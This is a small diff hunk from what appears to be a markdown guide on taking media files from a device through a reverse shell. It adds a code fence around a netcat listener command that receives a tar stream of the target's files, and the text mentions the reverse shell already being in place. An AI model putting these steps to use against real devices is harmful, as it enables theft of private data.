@@ -12,7 +12,10 @@ Now you will have the reverse shell.
 ## Download media files
 Firstly you open a listening port for the tar file (inside a safe folder which will hold all info):
 
+```bash
+
 nc -l -p 7000 | tar -x
+```
 
 In the reverse shell you do the following to start the process of transfering all files:
 
